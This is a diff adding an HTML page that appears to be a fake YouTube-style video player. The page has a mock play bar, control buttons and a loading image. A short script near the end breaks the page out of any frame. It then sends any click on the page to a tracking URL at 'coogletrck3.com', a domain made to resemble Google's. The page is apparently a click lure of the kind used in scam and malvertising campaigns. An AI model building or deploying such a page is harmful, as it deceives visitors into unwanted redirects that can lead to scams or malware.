@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loading</title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+<style>
+    html,
+    body {
+      padding: 0;
+      margin: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    body {
+      background-color: black;
+    }
+
+    .cont {
+      width: 90px;
+      height: 90px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      margin-top: -45px;
+      margin-left: -45px;
+    }
+
+    img {
+      height: 100%;
+    }
+
+    .mobile{
+      top: 12%;
+      margin-top: 0;
+    }
+
+.ytp-button {
+    border: none;
+    background-color: transparent;
+    padding: 0;
+    color: inherit;
+    text-align: inherit;
+    font-size: 100%;
+    font-family: inherit;
+    cursor: default;
+    line-height: inherit
+}
+
+.ytp-button:focus,.ytp-button {
+    outline: 0
+}
+
+.ytp-button::-moz-focus-inner {
+    padding: 0;
+    border: 0
+}
+
+.ytp-button:not([aria-disabled=true]):not([disabled]):not([aria-hidden=true]) {
+    cursor: pointer
+}
+
+.ytp-chrome-bottom {
+    position: absolute;
+    text-shadow: 0 0 2px rgba(0,0,0,.5);
+}
+
+.ytp-chrome-bottom {
+    bottom: 5px;
+    height: 36px;
+    width: 98%;
+    left: 1%;
+    z-index: 60;
+    padding-top: 3px;
+    text-align: left;
+    direction: ltr;
+    min-width:340px;
+}
+
+.ytp-chrome-controls .ytp-button {
+    opacity: .9;
+    display: inline-block;
+    width: 36px;
+    -moz-transition: opacity .1s cubic-bezier(0.4,0.0,1,1);
+    -webkit-transition: opacity .1s cubic-bezier(0.4,0.0,1,1);
+    transition: opacity .1s cubic-bezier(0.4,0.0,1,1);
+    overflow: hidden
+}
+
+.ytp-chrome-controls .ytp-button {
+    height: 100%
+}
+
+.ytp-chrome-controls .ytp-button:not([aria-disabled=true]):not([disabled]):hover {
+    opacity: 1;
+    -moz-transition: opacity .1s cubic-bezier(0.0,0.0,0.2,1);
+    -webkit-transition: opacity .1s cubic-bezier(0.0,0.0,0.2,1);
+    transition: opacity .1s cubic-bezier(0.0,0.0,0.2,1)
+}
+
+.ytp-svg-fill {
+    fill: #fff
+}
+
+.ytp-svg-shadow {
+    stroke: #000;
+    stroke-opacity: .15;
+    stroke-width: 2px;
+    fill: none
+}
+
+.ytp-chrome-controls {
+    height: 36px;
+    line-height: 36px;
+    font-size: 109%;
+    text-align: left;
+    direction: ltr
+}
+
+.ytp-left-controls {
+    float: left;
+    height: 100%
+}
+
+.ytp-right-controls {
+    float: right;
+    height: 100%
+}
+
+.ytp-chrome-bottom {
+    -moz-transition: opacity .25s cubic-bezier(0.0,0.0,0.2,1);
+    -webkit-transition: opacity .25s cubic-bezier(0.0,0.0,0.2,1);
+    transition: opacity .25s cubic-bezier(0.0,0.0,0.2,1);
+}
+
+.ytp-swatch-background-color {
+    background-color: #f00
+}
+
+.ytp-fullscreen-button-corner-0,.ytp-fullscreen-button-corner-1,.ytp-fullscreen-button-corner-2,.ytp-fullscreen-button-corner-3 {
+    -moz-transform: none;
+    -ms-transform: none;
+    -webkit-transform: none;
+    transform: none
+}
+
+@keyframes ytp-fullscreen-button-corner-0-animation {
+    50% {
+        -moz-transform: translate(-1px,-1px);
+        -ms-transform: translate(-1px,-1px);
+        -webkit-transform: translate(-1px,-1px);
+        transform: translate(-1px,-1px)
+    }
+}
+
+@keyframes ytp-fullscreen-button-corner-1-animation {
+    50% {
+        -moz-transform: translate(1px,-1px);
+        -ms-transform: translate(1px,-1px);
+        -webkit-transform: translate(1px,-1px);
+        transform: translate(1px,-1px)
+    }
+}
+
+@keyframes ytp-fullscreen-button-corner-2-animation {
+    50% {
+        -moz-transform: translate(1px,1px);
+        -ms-transform: translate(1px,1px);
+        -webkit-transform: translate(1px,1px);
+        transform: translate(1px,1px)
+    }
+}
+
+@keyframes ytp-fullscreen-button-corner-3-animation {
+    50% {
+        -moz-transform: translate(-1px,1px);
+        -ms-transform: translate(-1px,1px);
+        -webkit-transform: translate(-1px,1px);
+        transform: translate(-1px,1px)
+    }
+}
+
+.ytp-fullscreen-button:not([aria-disabled=true]):hover .ytp-fullscreen-button-corner-0 {
+    -moz-animation: ytp-fullscreen-button-corner-0-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    -webkit-animation: ytp-fullscreen-button-corner-0-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    animation: ytp-fullscreen-button-corner-0-animation .4s cubic-bezier(0.4,0.0,0.2,1)
+}
+
+.ytp-fullscreen-button:not([aria-disabled=true]):hover .ytp-fullscreen-button-corner-1 {
+    -moz-animation: ytp-fullscreen-button-corner-1-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    -webkit-animation: ytp-fullscreen-button-corner-1-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    animation: ytp-fullscreen-button-corner-1-animation .4s cubic-bezier(0.4,0.0,0.2,1)
+}
+
+.ytp-fullscreen-button:not([aria-disabled=true]):hover .ytp-fullscreen-button-corner-2 {
+    -moz-animation: ytp-fullscreen-button-corner-2-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    -webkit-animation: ytp-fullscreen-button-corner-2-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    animation: ytp-fullscreen-button-corner-2-animation .4s cubic-bezier(0.4,0.0,0.2,1)
+}
+
+.ytp-fullscreen-button:not([aria-disabled=true]):hover .ytp-fullscreen-button-corner-3 {
+    -moz-animation: ytp-fullscreen-button-corner-3-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    -webkit-animation: ytp-fullscreen-button-corner-3-animation .4s cubic-bezier(0.4,0.0,0.2,1);
+    animation: ytp-fullscreen-button-corner-3-animation .4s cubic-bezier(0.4,0.0,0.2,1)
+}
+
+.ytp-chrome-controls .ytp-play-button {
+    width: 46px
+}
+
+.ytp-progress-list {
+    z-index: 39;
+    background: rgba(255,255,255,.2);
+    height: 100%;
+    -moz-transform: scaleY(0.6);
+    -ms-transform: scaleY(0.6);
+    -webkit-transform: scaleY(0.6);
+    transform: scaleY(0.6);
+    -moz-transition: -moz-transform .1s cubic-bezier(0.4,0.0,1,1);
+    -webkit-transition: -webkit-transform .1s cubic-bezier(0.4,0.0,1,1);
+    -ms-transition: -ms-transform .1s cubic-bezier(0.4,0.0,1,1);
+    transition: transform .1s cubic-bezier(0.4,0.0,1,1);
+    position: relative
+}
+
+.ytp-play-progress {
+    position: absolute;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    height: 100%;
+    -moz-transform-origin: 0 0;
+    -ms-transform-origin: 0 0;
+    -webkit-transform-origin: 0 0;
+    transform-origin: 0 0
+}
+
+.ytp-play-progress {
+    z-index: 34
+}
+
+.ytp-progress-bar-container {
+    display: block;
+    position: absolute;
+    width: 100%;
+    bottom: 35px;
+    height: 5px
+}
+
+.ytp-progress-bar {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 31;
+    outline: none
+}
+
+.ytp-settings-button {
+    position: relative
+}
+
+.ytp-settings-button svg {
+    -moz-transition: -moz-transform .1s cubic-bezier(0.4,0.0,1,1);
+    -webkit-transition: -webkit-transform .1s cubic-bezier(0.4,0.0,1,1);
+    -ms-transition: -ms-transform .1s cubic-bezier(0.4,0.0,1,1);
+    transition: transform .1s cubic-bezier(0.4,0.0,1,1)
+}
+
+.ytp-time-display {
+    font-size: 100%;
+    display: inline-block;
+    vertical-align: top;
+    padding: 0 5px;
+    white-space: nowrap;
+    line-height: 40px;
+    color: #ddd;
+}
+  </style>
+<style type="text/css">
+    body {
+        /* background-color: #fff; */
+        position: relative;
+        /* height: calc(100vh - 100px); */
+        overflow: hidden;
+        padding: 0;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "SF UI Text", "SF Pro Text", Helvetica, Arial, sans-serif!important;
+        background-size: cover;
+  background-repeat: no-repeat;
+
+    }
+    .ui-widget {
+      font-family: -apple-system, BlinkMacSystemFont, "SF UI Text", "SF Pro Text", Helvetica, Arial, sans-serif!important;
+
+    }
+    body:before {
+      position: absolute;
+      left: 0;
+      top: 0;
+      content: '';
+      /* background: rgba(0,0,0,.40); */
+      width: 100%;
+      height: 100%;
+    }
+    .wrapper {
+      height: 100%;
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 100%;
+    }
+
+    .ui-dialog-titlebar {
+        display: none;
+    }
+    .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
+        text-align: center;
+        float: none !important;
+}
+.ui-dialog {
+top: 30%!important;
+left: 50%!important;
+-webkit-transform: translate(-50%, -50%);
+  -ms-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%)
+}
+
+.ui-dialog .ui-dialog-buttonpane {
+padding: 0;
+}
+
+.ui-corner-all, .ui-corner-top, .ui-corner-right, .ui-corner-tr {
+border-radius: 12px;
+border: none!important;
+}
+
+.ui-button.ui-corner-all.ui-widget {
+font-size: 100%;
+font-weight: 400;
+text-decoration: none;
+text-shadow: 0 0 0 #fff;
+z-index: 5;
+
+white-space: nowrap;
+color: #0379f4;
+background-color: transparent;
+border: none;
+}
+
+.ui-dialog {
+  /* text-align:center;
+  padding-top:10px;
+  height:58px;
+  width:150px;
+  border-radius:10px;
+  background:#e8e8e8; */
+  /* animation-duration:.75s;
+  animation-name:popin; */
+  margin:100px auto auto;
+  opacity:0;
+  visibility: hidden;
+  transition: all .25s ease-in-out;
+}
+.ui-dialog.show {
+    margin:50px auto auto;
+    opacity:1;
+  visibility: visible;
+}
+
+@keyframes popin {
+  from {
+    margin:100px auto auto;
+    opacity:0;
+  }
+  to {
+    margin:50px auto auto;
+  }
+}
+
+</style>
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
+<script>
+var clickURL = "https://coogletrck3.com/click.php?key=vwz746opdlp57g6z1mxc";
+
+if (top != window) {
+top.location = window.location;
+}
+
+function go_click() {
+window.location = clickURL;
+}
+</script>
+</head>
+<body onclick="go_click();">
+<div class="cont">
+<img src="loading.gif" alt="">
+</div>
+<div class="ytp-chrome-bottom" data-layer="8">
+<div class="ytp-progress-bar-container" aria-disabled="true" style="height: 5px;">
+<div class="ytp-progress-bar " tabindex="0" role="slider" aria-label="" aria-valuemin="0" aria-valuemax="0" aria-valuenow="0" aria-valuetext="0:00">
+<div class="ytp-progress-list">
+<div class="ytp-play-progress ytp-swatch-background-color" style="left: 0px; transform: scaleX(0.194237);"></div>
+</div>
+</div>
+</div>
+<div class="ytp-chrome-controls">
+<div class="ytp-left-controls">
+<button class="ytp-play-button ytp-button" aria-label="Watch"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-11"></use>
+<path class="ytp-svg-fill" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z" id="ytp-id-11"></path>
+</svg></button>
+<a class="ytp-next-button ytp-button" title="Next" aria-disabled="false"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-12"></use>
+<path class="ytp-svg-fill" d="M 12,24 20.5,18 12,12 V 24 z M 22,12 v 12 h 2 V 12 h -2 z" id="ytp-id-12"></path>
+</svg></a>
+<button class="ytp-mute-button ytp-button" data-visual-id="5" title="Disable sound" style=""><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-14"></use>
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-15"></use>
+<defs>
+<clipPath id="ytp-svg-volume-animation-mask">
+<path d="m 14.35,-0.14 -5.86,5.86 20.73,20.78 5.86,-5.91 z"></path>
+<path d="M 7.07,6.87 -1.11,15.33 19.61,36.11 27.80,27.60 z"></path>
+<path class="ytp-svg-volume-animation-mover" d="M 9.09,5.20 6.47,7.88 26.82,28.77 29.66,25.99 z" transform="translate(0, 0)"></path>
+</clipPath>
+<clipPath id="ytp-svg-volume-animation-slash-mask">
+<path class="ytp-svg-volume-animation-mover" d="m -11.45,-15.55 -4.44,4.51 20.45,20.94 4.55,-4.66 z" transform="translate(0, 0)"></path>
+</clipPath>
+</defs>
+<path class="ytp-svg-fill ytp-svg-volume-animation-speaker" clip-path="url(#ytp-svg-volume-animation-mask)" d="M8,21 L12,21 L17,26 L17,10 L12,15 L8,15 L8,21 Z M19,14 L19,22 C20.48,21.32 21.5,19.77 21.5,18 C21.5,16.26 20.48,14.74 19,14 ZM19,11.29 C21.89,12.15 24,14.83 24,18 C24,21.17 21.89,23.85 19,24.71 L19,26.77 C23.01,25.86 26,22.28 26,18 C26,13.72 23.01,10.14 19,9.23 L19,11.29 Z" fill="#fff" id="ytp-id-14"></path>
+<path class="ytp-svg-fill ytp-svg-volume-animation-hider" clip-path="url(#ytp-svg-volume-animation-slash-mask)" d="M 9.25,9 7.98,10.27 24.71,27 l 1.27,-1.27 Z" fill="#fff" id="ytp-id-15" style="display: none;"></path>
+</svg></button>
+<div class="ytp-time-display notranslate" style=""><span class="ytp-time-current">0:11</span><span class="ytp-time-separator">
+/ </span><span class="ytp-time-duration">1:38</span></div>
+</div>
+<div class="ytp-right-controls"><button class="ytp-button ytp-settings-button" aria-haspopup="true" aria-owns="ytp-id-17" style="" title="Settings"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-18"></use>
+<path d="m 23.94,18.78 c .03,-0.25 .05,-0.51 .05,-0.78 0,-0.27 -0.02,-0.52 -0.05,-0.78 l 1.68,-1.32 c .15,-0.12 .19,-0.33 .09,-0.51 l -1.6,-2.76 c -0.09,-0.17 -0.31,-0.24 -0.48,-0.17 l -1.99,.8 c -0.41,-0.32 -0.86,-0.58 -1.35,-0.78 l -0.30,-2.12 c -0.02,-0.19 -0.19,-0.33 -0.39,-0.33 l -3.2,0 c -0.2,0 -0.36,.14 -0.39,.33 l -0.30,2.12 c -0.48,.2 -0.93,.47 -1.35,.78 l -1.99,-0.8 c -0.18,-0.07 -0.39,0 -0.48,.17 l -1.6,2.76 c -0.10,.17 -0.05,.39 .09,.51 l 1.68,1.32 c -0.03,.25 -0.05,.52 -0.05,.78 0,.26 .02,.52 .05,.78 l -1.68,1.32 c -0.15,.12 -0.19,.33 -0.09,.51 l 1.6,2.76 c .09,.17 .31,.24 .48,.17 l 1.99,-0.8 c .41,.32 .86,.58 1.35,.78 l .30,2.12 c .02,.19 .19,.33 .39,.33 l 3.2,0 c .2,0 .36,-0.14 .39,-0.33 l .30,-2.12 c .48,-0.2 .93,-0.47 1.35,-0.78 l 1.99,.8 c .18,.07 .39,0 .48,-0.17 l 1.6,-2.76 c .09,-0.17 .05,-0.39 -0.09,-0.51 l -1.68,-1.32 0,0 z m -5.94,2.01 c -1.54,0 -2.8,-1.25 -2.8,-2.8 0,-1.54 1.25,-2.8 2.8,-2.8 1.54,0 2.8,1.25 2.8,2.8 0,1.54 -1.25,2.8 -2.8,2.8 l 0,0 z" fill="#fff" id="ytp-id-18"></path>
+</svg></button><button class="ytp-size-button ytp-button"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-20"></use>
+<path d="m 28,11 0,14 -20,0 0,-14 z m -18,2 16,0 0,10 -16,0 0,-10 z" fill="#fff" fill-rule="evenodd" id="ytp-id-20"></path>
+</svg></button><button class="ytp-fullscreen-button ytp-button" title="Full screen"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<g class="ytp-fullscreen-button-corner-0">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-22"></use>
+<path class="ytp-svg-fill" d="m 10,16 2,0 0,-4 4,0 0,-2 L 10,10 l 0,6 0,0 z" id="ytp-id-22"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-1">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-23"></use>
+<path class="ytp-svg-fill" d="m 20,10 0,2 4,0 0,4 2,0 L 26,10 l -6,0 0,0 z" id="ytp-id-23"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-2">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-24"></use>
+<path class="ytp-svg-fill" d="m 24,24 -4,0 0,2 L 26,26 l 0,-6 -2,0 0,4 0,0 z" id="ytp-id-24"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-3">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-25"></use>
+<path class="ytp-svg-fill" d="M 12,20 10,20 10,26 l 6,0 0,-2 -4,0 0,-4 0,0 z" id="ytp-id-25"></path>
+</g>
+</svg></button></div>
+</div>
+</div>
+</body></html>
